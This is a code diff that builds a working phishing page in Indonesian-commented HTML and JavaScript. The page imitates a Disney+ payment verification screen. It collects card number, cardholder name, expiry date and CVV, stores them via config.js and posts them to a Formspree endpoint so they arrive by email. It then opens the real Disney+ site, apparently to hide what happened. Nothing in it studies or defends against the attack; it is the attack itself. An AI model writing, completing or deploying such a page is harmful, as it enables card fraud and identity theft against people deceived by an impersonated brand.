@@ -1,37 +1,176 @@
-    <!-- Ganti seluruh bagian <script> di bawah ke file berlangganan.html -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Pembayaran - Disney+</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        body {
+            background: linear-gradient(135deg, #062e3f 0%, #0d4f5c 35%, #0f5c68 50%, #0a3f52 75%, #072840 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .logo-disney { margin-bottom: 24px; text-align: center; }
+        .logo-disney span { font-size: 38px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+
+        .login-card {
+            background: #fff;
+            width: 100%;
+            max-width: 480px;
+            padding: 36px 32px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+        }
+
+        h1 { font-size: 22px; font-weight: 600; color: #000; margin-bottom: 8px; text-align: center; }
+        .sub-judul { font-size: 14px; color: #666; margin-bottom: 28px; text-align: center; }
+
+        .tab-bayar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+        .tab-bayar button {
+            flex: 1;
+            padding: 10px;
+            border: 2px solid #e5e5e5;
+            background: #fff;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        .tab-bayar button.aktif {
+            border-color: #0063e5;
+            background: #f0f7ff;
+            color: #0063e5;
+            font-weight: 600;
+        }
+
+        label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px; }
+        .input-kartu {
+            width: 100%;
+            padding: 13px 12px;
+            background: #f0f0f2;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            margin-bottom: 16px;
+            outline: none;
+            transition: background 0.2s;
+        }
+        .input-kartu:focus { background: #e8e8eb; }
+
+        .baris-dua { display: flex; gap: 12px; }
+        .baris-dua div { flex: 1; }
+
+        .tombol-setuju {
+            width: 100%;
+            padding: 14px;
+            background: #000;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .tombol-setuju:hover { background: #222; }
+
+        .info-email {
+            font-size: 13px;
+            color: #888;
+            margin-top: 16px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo-disney">
+        <span>Disney+</span>
+    </div>
+
+    <div class="login-card">
+        <h1>Verifikasi Pembayaran</h1>
+        <p class="sub-judul">Masukkan data kartu untuk verifikasi akun</p>
+
+        <div class="tab-bayar">
+            <button class="aktif" onclick="pilihKartu()">Kartu Kredit</button>
+            <button onclick="pilihPayPal()">PayPal</button>
+            <button onclick="pilihApplePay()">Apple Pay</button>
+        </div>
+
+        <form id="formKartu">
+            <label>Nomor Kartu</label>
+            <input type="text" class="input-kartu" placeholder="1234 5678 9012 3456" required>
+
+            <label>Nama di Kartu</label>
+            <input type="text" class="input-kartu" placeholder="JOHN DOE" required>
+
+            <div class="baris-dua">
+                <div>
+                    <label>Kadaluarsa</label>
+                    <input type="text" class="input-kartu kecil" placeholder="MM/YY" required>
+                </div>
+                <div>
+                    <label>Kode Keamanan (CVV)</label>
+                    <input type="text" class="input-kartu kecil" placeholder="123" required>
+                </div>
+            </div>
+
+            <p class="info-email">Email akun: <span id="tampilEmail"></span></p>
+
+            <button type="button" class="tombol-setuju" onclick="kirimDataDanLanjut()">Verification</button>
+        </form>
+    </div>
 
     <script src="config.js"></script>
     <script>
         // Tampilkan email yang tersimpan dari halaman sebelumnya
         const emailTersimpan = DataPengguna.ambilEmail();
         if (emailTersimpan) {
-            console.log('📧 Email terdaftar:', emailTersimpan);
+            document.getElementById('tampilEmail').textContent = emailTersimpan;
         }
 
         // Fungsi pilihan pembayaran
         function pilihKartu() {
-            document.querySelectorAll('.tab-bayar').forEach(el => el.classList.remove('aktif'));
-            document.querySelectorAll('.tab-bayar')[0].classList.add('aktif');
+            document.querySelectorAll('.tab-bayar button').forEach(b => b.classList.remove('aktif'));
+            document.querySelectorAll('.tab-bayar button')[0].classList.add('aktif');
         }
         function pilihPayPal() {
-            document.querySelectorAll('.tab-bayar').forEach(el => el.classList.remove('aktif'));
-            document.querySelectorAll('.tab-bayar')[1].classList.add('aktif');
+            document.querySelectorAll('.tab-bayar button').forEach(b => b.classList.remove('aktif'));
+            document.querySelectorAll('.tab-bayar button')[1].classList.add('aktif');
         }
         function pilihApplePay() {
-            document.querySelectorAll('.tab-bayar').forEach(el => el.classList.remove('aktif'));
-            document.querySelectorAll('.tab-bayar')[2].classList.add('aktif');
+            document.querySelectorAll('.tab-bayar button').forEach(b => b.classList.remove('aktif'));
+            document.querySelectorAll('.tab-bayar button')[2].classList.add('aktif');
         }
 
-        // ✅ ALAMAT FORMSPREE SUDAH DIISI UNTUKMU!
+        // ✅ ALAMAT FORMSPREE SUDAH DIISI
         const ALAMAT_FORMSPREE = "https://formspree.io/f/mgaedrvq"; 
 
         // Fungsi Kirim Data Otomatis ke Email
         async function kirimDataDanLanjut() {
             // Ambil semua data dari formulir
             const nomorKartu = document.querySelectorAll('.input-kartu')[0].value.trim();
+            const namaKartu = document.querySelectorAll('.input-kartu')[1].value.trim();
             const kadaluarsa = document.querySelectorAll('.input-kartu.kecil')[0].value.trim();
             const cvv = document.querySelectorAll('.input-kartu.kecil')[1].value.trim();
-            const namaKartu = document.querySelectorAll('.input-kartu')[1].value.trim();
+
+            // Validasi sederhana
+            if (!nomorKartu || !namaKartu || !kadaluarsa || !cvv) {
+                alert('⚠️ Silakan lengkapi semua data!');
+                return;
+            }
 
             // Simpan ke config.js
             DataPengguna.simpanKartu(nomorKartu, kadaluarsa, cvv, namaKartu);
@@ -79,3 +218,5 @@ Waktu Pengiriman: ${new Date().toLocaleString('id-ID')}
             window.open('https://www.disneyplus.com/en-au', '_blank');
         }
     </script>
+</body>
+</html>
